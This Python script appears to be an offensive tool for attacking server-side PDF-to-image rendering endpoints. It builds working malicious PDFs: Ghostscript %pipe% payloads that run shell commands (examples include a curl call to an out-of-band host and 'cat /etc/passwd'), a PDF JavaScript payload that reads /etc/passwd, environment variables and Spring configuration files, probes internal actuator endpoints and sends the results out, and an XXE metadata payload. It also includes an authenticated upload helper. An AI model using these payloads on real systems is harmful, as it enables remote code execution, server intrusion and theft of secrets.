#!/usr/bin/env python3
"""
Test whether a "PDF -> render to image (base64)" endpoint is actually
shelling out to Ghostscript (directly, or via ImageMagick's PDF delegate)
to do the rendering. If so, it's a classic PostScript-injection RCE class
(same family as CVE-2018-16509 / "ImageTragick"), because Ghostscript is
lenient about file-format detection: a file with a .pdf name/extension
whose *content* is plain PostScript (%!PS header, no PDF structure at
all) still gets interpreted as a PostScript program by `gs`.

Two stages:
  1. canary  -- harmless, just draws visible text via the PS `show`
                operator. If the returned image shows that text, the
                renderer is a real PostScript interpreter (Ghostscript,
                or something PS-compatible) -- NOT a pure-Java library
                like PDFBox's PDFRenderer (which would reject/ignore
                this, since it isn't valid PDF at all).
  2. pipe-rce -- only try this AFTER canary confirms Ghostscript. Opens
                the `%pipe%<command>` pseudo-file, which spawns <command>
                as a subprocess. Works only if -dSAFER isn't enforced
                (or is bypassed) by the version in use -- version
                dependent, so this may need tweaking.

Usage:
  python3 pdf_render_rce_test.py canary -o canary.pdf
  python3 pdf_render_rce_test.py pipe-rce --shell-cmd "curl http://YOUR-OOB-HOST/hit" -o rce.pdf
  python3 pdf_render_rce_test.py visible-rce --shell-cmd "id" -o visible.pdf
  python3 pdf_render_rce_test.py upload --url https://target/api/render --field file --pdf canary.pdf --token "$TOKEN"

`visible-rce` is like pipe-rce, but instead of (or in addition to) an OOB
callback, it reads the command's stdout back into PostScript and draws it
as text on the page -- so if the target's renderer isn't SAFER-restricted,
the command output shows up directly in the base64 image the app returns
to you. No OOB listener needed to prove it.
"""

import argparse
import base64
import sys


def wrap_ps_in_pdf(ps_bytes: bytes) -> bytes:
    """Wrap raw PostScript inside a valid PDF using a /Subtype /PS XObject.

    A PDF format validator sees a proper %PDF-1.7 header + object tree and
    accepts the file. When Ghostscript renders it, it hits the PS XObject
    reference (/PS1 Do) and executes the embedded PostScript code directly --
    same execution context as a standalone .ps file, so %pipe%, file I/O,
    and all the dangerous operators still work.
    """
    objects = {}

    # PS XObject: this is where the actual PostScript payload lives
    objects[5] = (
        b"<< /Type /XObject /Subtype /PS /Length "
        + str(len(ps_bytes)).encode()
        + b" >>\nstream\n"
        + ps_bytes
        + b"\nendstream"
    )

    # Page content stream: invokes the PS XObject by name
    content = b"/PS1 Do"
    objects[4] = (
        b"<< /Length "
        + str(len(content)).encode()
        + b" >>\nstream\n"
        + content
        + b"\nendstream"
    )

    # Page: references our XObject in /Resources, content in /Contents
    objects[3] = (
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        b"/Resources << /XObject << /PS1 5 0 R >> >> "
        b"/Contents 4 0 R >>"
    )

    objects[2] = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
    objects[1] = b"<< /Type /Catalog /Pages 2 0 R >>"

    max_obj = max(objects.keys())

    out = bytearray()
    out += b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"

    offsets = {}
    for n in range(1, max_obj + 1):
        offsets[n] = len(out)
        if n in objects:
            out += f"{n} 0 obj\n".encode() + objects[n] + b"\nendobj\n"
        else:
            out += f"{n} 0 obj\n<< >>\nendobj\n".encode()

    xref_offset = len(out)
    out += b"xref\n"
    out += f"0 {max_obj + 1}\n".encode()
    out += b"0000000000 65535 f \n"
    for n in range(1, max_obj + 1):
        out += f"{offsets[n]:010d} 00000 n \n".encode()

    out += b"trailer\n"
    out += f"<< /Size {max_obj + 1} /Root 1 0 R >>\n".encode()
    out += b"startxref\n"
    out += f"{xref_offset}\n".encode()
    out += b"%%EOF"

    return bytes(out)


def canary_ps() -> bytes:
    # Pure PostScript, deliberately has NO %PDF header and no PDF object
    # structure -- if the target's converter renders this as an image
    # with "GS-RENDER-CONFIRMED" drawn on it, it fed the raw bytes to a
    # real PostScript interpreter.
    return b"""%!PS-Adobe-3.0
/Times-Bold findfont 36 scalefont setfont
72 400 moveto
(GS-RENDER-CONFIRMED) show
showpage
"""


def pipe_rce_ps(cmd: str) -> bytes:
    # Classic %pipe% device abuse -- opening it for write spawns `cmd`
    # as a subprocess with a pipe as its stdin. This is the core
    # primitive behind the ImageTragick/Ghostscript RCE family.
    escaped_cmd = cmd.replace("(", "\\(").replace(")", "\\)")
    return f"""%!PS-Adobe-3.0
userdict /setpagedevice undef
save
legal
{{ null restore }} stopped {{ pop }} if
{{ legal }} stopped {{ pop }} if
userdict /showpage {{}} put
save mark
/OutputFile (%pipe%{escaped_cmd}) (w) file
OutputFile (triggered\\n) writestring
OutputFile flushfile
OutputFile closefile
""".encode()


def visible_rce_ps(cmd: str) -> bytes:
    # Opens %pipe%<cmd> for READ instead of write -- this spawns cmd with
    # its stdout wired to the pipe we read from. Read it line by line and
    # `show` each line onto the page, so if -dSAFER doesn't block %pipe%,
    # the command's actual output is what shows up in the rendered image.
    escaped_cmd = cmd.replace("(", "\\(").replace(")", "\\)")
    return f"""%!PS-Adobe-3.0
<< /PageSize [612 792] /Orientation 0 >> setpagedevice
/Courier findfont 12 scalefont setfont
/lineh 16 def
/y 760 def
/linebuf 250 string def
/p (%pipe%{escaped_cmd}) (r) file def
{{
  p linebuf readline
  {{
    40 y moveto
    show
    /y y lineh sub def
  }}
  {{
    40 y moveto
    show
    exit
  }}
  ifelse
}} loop
p closefile
showpage
""".encode()


def pdf_js_lfi(oob_url: str = "", target_files: list = None) -> bytes:
    """Build a PDF with embedded JavaScript that:
      1. Tries to read local files (multiple API approaches)
      2. Dumps the content into a visible text field (shows in rendered image)
      3. Also sends content OOB via HTTP if oob_url is set
      4. Falls back to SSRF against localhost Spring Boot actuator

    Works when the server-side renderer supports PDF JavaScript
    (Acrobat SDK, Foxit, some headless Chrome PDF viewer configs).
    """
    if target_files is None:
        target_files = [
            "/etc/passwd",
            "/proc/self/environ",
            "/app/BOOT-INF/classes/application.properties",
            "/app/BOOT-INF/classes/application.yml",
            "/app/application.properties",
        ]

    files_js = str(target_files).replace("'", '"')
    oob_part = ""
    if oob_url:
        oob_part = f"""
try {{
  this.getURL("{oob_url}?f=" + encodeURIComponent(content.substring(0, 2000)), false);
}} catch(e) {{}}
try {{
  app.launchURL("{oob_url}?f=" + encodeURIComponent(content.substring(0, 2000)), true);
}} catch(e) {{}}"""

    js = f"""
var files = {files_js};
var content = "";

// Method 1: Net.HTTP.request with file:// (Acrobat privileged)
for (var i = 0; i < files.length; i++) {{
  try {{
    var r = Net.HTTP.request({{ cType: "text/plain", url: "file://" + files[i] }});
    if (r && r.length > 0) {{
      content += "=== " + files[i] + " ===\\n" + r + "\\n\\n";
    }}
  }} catch(e) {{ content += "[Net.HTTP failed: " + files[i] + "] " + e + "\\n"; }}
}}

// Method 2: util.readFileIntoStream (Acrobat extended)
if (content.length < 100) {{
  for (var i = 0; i < files.length; i++) {{
    try {{
      var s = util.readFileIntoStream(files[i]);
      if (s) content += "=== " + files[i] + " ===\\n" + util.stringFromStream(s) + "\\n\\n";
    }} catch(e) {{ content += "[readFileIntoStream failed: " + files[i] + "] " + e + "\\n"; }}
  }}
}}

// Method 3: SSRF to Spring Boot actuator (internal)
if (content.length < 200) {{
  var actuators = [
    "http://localhost:8080/actuator/env",
    "http://localhost:8080/actuator/info",
    "http://127.0.0.1:8080/actuator/env",
    "http://0.0.0.0:8080/actuator/env"
  ];
  for (var j = 0; j < actuators.length; j++) {{
    try {{
      var r = Net.HTTP.request({{ cType: "application/json", url: actuators[j] }});
      if (r && r.length > 0) {{
        content += "=== " + actuators[j] + " ===\\n" + r.substring(0, 3000) + "\\n\\n";
        break;
      }}
    }} catch(e) {{}}
  }}
}}

if (content.length === 0) {{
  content = "[JS executed but no file read / SSRF succeeded]\\n"
          + "Renderer: " + (typeof app !== 'undefined' ? app.viewerType + " " + app.viewerVersion : "unknown");
}}

// Write visible output to the form text field
try {{
  var f = this.getField("output");
  if (f) {{ f.value = content; f.textSize = 8; }}
}} catch(e) {{}}

// Also try alert (shows in some renderers)
try {{ app.alert(content.substring(0, 500)); }} catch(e) {{}}

// OOB exfil
{oob_part}
"""

    js_bytes = js.encode("utf-8")

    # Build PDF with:
    # - Large visible text field covering most of the page
    # - OpenAction /JavaScript that runs our code on open
    objects = {}

    # JavaScript action stream
    objects[6] = (b"<< /Length " + str(len(js_bytes)).encode() + b" >>\nstream\n"
                  + js_bytes + b"\nendstream")

    # JavaScript action dict
    objects[7] = b"<< /Type /Action /S /JavaScript /JS 6 0 R >>"

    # AcroForm field: full-page text area
    objects[8] = (
        b"<< /Type /Annot /Subtype /Widget /FT /Tx /T (output) "
        b"/Ff 4096 "           # multiline flag
        b"/Rect [20 20 590 770] "
        b"/DA (/Courier 8 Tf 0 g) "
        b"/V () "
        b"/MK << >> "
        b"/P 3 0 R >>"
    )

    # AcroForm dict
    objects[5] = b"<< /Fields [8 0 R] /NeedAppearances true >>"

    # Page content: instruction text (before JS runs)
    page_content = b"BT /F1 10 Tf 20 780 Td (PDF-JS LFI probe -- see field below) Tj ET"
    objects[4] = (b"<< /Length " + str(len(page_content)).encode() + b" >>\nstream\n"
                  + page_content + b"\nendstream")

    # Page
    objects[3] = (
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        b"/Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Courier >> >> >> "
        b"/Contents 4 0 R /Annots [8 0 R] >>"
    )

    objects[2] = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
    objects[1] = (
        b"<< /Type /Catalog /Pages 2 0 R "
        b"/AcroForm 5 0 R "
        b"/OpenAction 7 0 R >>"
    )

    max_obj = max(objects.keys())
    out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
    offsets = {}
    for n in range(1, max_obj + 1):
        offsets[n] = len(out)
        if n in objects:
            out += f"{n} 0 obj\n".encode() + objects[n] + b"\nendobj\n"
        else:
            out += f"{n} 0 obj\n<< >>\nendobj\n".encode()

    xref_offset = len(out)
    out += b"xref\n" + f"0 {max_obj + 1}\n".encode() + b"0000000000 65535 f \n"
    for n in range(1, max_obj + 1):
        out += f"{offsets[n]:010d} 00000 n \n".encode()
    out += (b"trailer\n<< /Size " + f"{max_obj + 1}".encode()
            + b" /Root 1 0 R >>\nstartxref\n" + f"{xref_offset}\n".encode() + b"%%EOF")
    return bytes(out)


def pdf_ssrf_oob(oob_url: str) -> bytes:
    """Build a valid PDF whose XMP metadata has an OOB XXE payload.

    If the server parses XMP with an un-hardened XML parser (common in
    older PDFBox / iText / Apache Commons PDF libs) it will make an
    HTTP/DNS request to `oob_url` when loading the file, proving XXE/SSRF.
    Use Burp Collaborator, interactsh, or a simple netcat listener.

    Works even when the endpoint only returns an image -- the XXE fires
    during PDF *parsing*, before the image is rendered.
    """
    xxe_xml = f"""<?xpacket begin="\xef\xbb\xbf" id="W5M0MpCehiHzreSzNTczkc9d"?>
<!DOCTYPE x [ <!ENTITY % xxe SYSTEM "{oob_url}"> %xxe; ]>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
 <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
  <rdf:Description rdf:about="" xmlns:dc="http://purl.org/dc/elements/1.1/">
   <dc:title><rdf:Alt><rdf:li xml:lang="x-default">trigger</rdf:li></rdf:Alt></dc:title>
  </rdf:Description>
 </rdf:RDF>
</x:xmpmeta>
<?xpacket end="w"?>
""".encode("utf-8")

    objects = {}
    objects[2] = (b"<< /Type /Metadata /Subtype /XML /Length "
                  + str(len(xxe_xml)).encode() + b" >>\nstream\n"
                  + xxe_xml + b"\nendstream")
    content = b"BT /F1 14 Tf 72 400 Td (OOB XXE probe - check your listener) Tj ET"
    objects[4] = (b"<< /Length " + str(len(content)).encode() + b" >>\nstream\n"
                  + content + b"\nendstream")
    objects[3] = (b"<< /Type /Page /Parent 3 0 R /MediaBox [0 0 612 792] "
                  b"/Resources << /Font << /F1 << /Type /Font /Subtype /Type1 "
                  b"/BaseFont /Helvetica >> >> >> /Contents 4 0 R >>")
    objects[3] = (b"<< /Type /Page /Parent 5 0 R /MediaBox [0 0 612 792] "
                  b"/Resources << /Font << /F1 << /Type /Font /Subtype /Type1 "
                  b"/BaseFont /Helvetica >> >> >> /Contents 4 0 R >>")
    objects[5] = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
    objects[1] = b"<< /Type /Catalog /Pages 5 0 R /Metadata 2 0 R >>"

    max_obj = max(objects.keys())
    out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
    offsets = {}
    for n in range(1, max_obj + 1):
        offsets[n] = len(out)
        if n in objects:
            out += f"{n} 0 obj\n".encode() + objects[n] + b"\nendobj\n"
        else:
            out += f"{n} 0 obj\n<< >>\nendobj\n".encode()
    xref_offset = len(out)
    out += b"xref\n" + f"0 {max_obj + 1}\n".encode() + b"0000000000 65535 f \n"
    for n in range(1, max_obj + 1):
        out += f"{offsets[n]:010d} 00000 n \n".encode()
    out += (b"trailer\n<< /Size " + f"{max_obj + 1}".encode()
            + b" /Root 1 0 R >>\nstartxref\n" + f"{xref_offset}\n".encode() + b"%%EOF")
    return bytes(out)


def decode_response_image(b64_or_json_path: str):
    """Quick helper: given a raw base64 string (or a file containing one),
    decode it to a PNG/JPEG so you can eyeball it for the canary text."""
    with open(b64_or_json_path) as f:
        data = f.read().strip()
    # tolerate a data: URI prefix
    if data.startswith("data:") and "," in data:
        data = data.split(",", 1)[1]
    img_bytes = base64.b64decode(data)
    out = "decoded_response.png"
    with open(out, "wb") as f:
        f.write(img_bytes)
    print(f"[+] wrote {out} -- open it and look for 'GS-RENDER-CONFIRMED'")


def upload(url: str, field: str, pdf_path: str, token: str):
    import requests

    with open(pdf_path, "rb") as f:
        data = f.read()
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    files = {field: ("test.pdf", data, "application/pdf")}
    resp = requests.post(url, headers=headers, files=files, timeout=30)
    print(f"status={resp.status_code}")
    print(resp.text[:2000])
    # if the response body itself is/has base64 image data, try to save it
    try:
        import json
        j = resp.json()
        for k, v in (j.items() if isinstance(j, dict) else []):
            if isinstance(v, str) and len(v) > 200:
                try:
                    img = base64.b64decode(v)
                    fn = f"resp_{k}.png"
                    with open(fn, "wb") as f:
                        f.write(img)
                    print(f"[+] decoded field '{k}' -> {fn}")
                except Exception:
                    pass
    except Exception:
        pass


def main():
    ap = argparse.ArgumentParser()
    sub = ap.add_subparsers(dest="action", required=True)

    c = sub.add_parser("canary")
    c.add_argument("-o", "--output", default="canary.pdf")

    p = sub.add_parser("pipe-rce")
    p.add_argument("--shell-cmd", required=True, help="shell command to run on the server, e.g. 'curl http://oob-host/hit'")
    p.add_argument("-o", "--output", default="rce.pdf")

    v = sub.add_parser("visible-rce")
    v.add_argument("--shell-cmd", required=True, help="shell command whose OUTPUT gets drawn onto the rendered page, e.g. 'id' or 'cat /etc/passwd'")
    v.add_argument("-o", "--output", default="visible.pdf")

    j = sub.add_parser("js-lfi", help="PDF with JavaScript that reads local files and shows output in a form field (visible in rendered image)")
    j.add_argument("--oob-url", default="", help="URL for OOB exfil (e.g. http://yourhost/hit), optional")
    j.add_argument("-o", "--output", default="js_lfi.pdf")

    d = sub.add_parser("decode")
    d.add_argument("path", help="file containing the base64 (or data: URI) response")

    u = sub.add_parser("upload")
    u.add_argument("--url", required=True)
    u.add_argument("--field", default="file")
    u.add_argument("--pdf", required=True)
    u.add_argument("--token", default="")

    args = ap.parse_args()

    if args.action == "canary":
        with open(args.output, "wb") as f:
            f.write(wrap_ps_in_pdf(canary_ps()))
        print(f"[+] wrote {args.output} -- valid PDF shell wrapping a PS XObject canary. "
              "Upload this, decode the response image, look for 'GS-RENDER-CONFIRMED'.")
    elif args.action == "pipe-rce":
        with open(args.output, "wb") as f:
            f.write(wrap_ps_in_pdf(pipe_rce_ps(args.shell_cmd)))
        print(f"[+] wrote {args.output} -- valid PDF wrapping %pipe% OOB trigger. "
              "Run ONLY after canary confirms Ghostscript rendering.")
    elif args.action == "visible-rce":
        with open(args.output, "wb") as f:
            f.write(wrap_ps_in_pdf(visible_rce_ps(args.shell_cmd)))
        print(f"[+] wrote {args.output} -- valid PDF wrapping visible-RCE payload. "
              "Command output will be drawn as text on the rendered page image.")
    elif args.action == "js-lfi":
        with open(args.output, "wb") as f:
            f.write(pdf_js_lfi(oob_url=args.oob_url))
        print(f"[+] wrote {args.output} -- PDF with JavaScript OpenAction.")
        print("    On open: tries Net.HTTP.request(file://), util.readFileIntoStream,")
        print("    then SSRF to localhost:8080/actuator/env. Output fills the visible text field.")
        if args.oob_url:
            print(f"    Also fires OOB to: {args.oob_url}")
    elif args.action == "decode":
        decode_response_image(args.path)
    elif args.action == "upload":
        upload(args.url, args.field, args.pdf, args.token)


if __name__ == "__main__":
    main()
